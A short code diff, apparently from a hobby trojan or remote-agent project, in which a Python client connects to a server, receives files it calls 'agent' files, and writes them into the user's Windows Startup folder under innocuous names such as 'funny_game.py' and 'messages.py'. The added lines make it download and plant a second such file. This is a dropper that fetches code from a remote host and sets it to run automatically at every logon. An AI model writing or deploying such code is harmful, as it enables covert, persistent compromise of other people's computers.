@@ -111,9 +111,30 @@ my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
 signal = 'g'.encode()
 my_socket.send(signal)
 user_name = os.getlogin()
+# location for the agent file
 location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
            "\\Windows\\Start Menu\\Programs\\" \
-           "Startup\\funny_game".format(user_name)
+           "Startup\\messages.py".format(user_name)
+# downloading the agent file
+with open(location, "wb") as f:
+    done = False
+    while not done:
+        try:
+            raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
+            size = raw_size.decode()
+            if size.isdigit():
+                data = my_socket.recv(int(size))
+            if data == EOF:
+                break
+            print(len(data))
+            f.write(data)
+        except Exception:
+            done = True
+
+location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
+           "\\Windows\\Start Menu\\Programs\\" \
+           "Startup\\funny_game.py".format(user_name)
+# downloading the agent file
 with open(location, "wb") as f:
     done = False
     while not done:
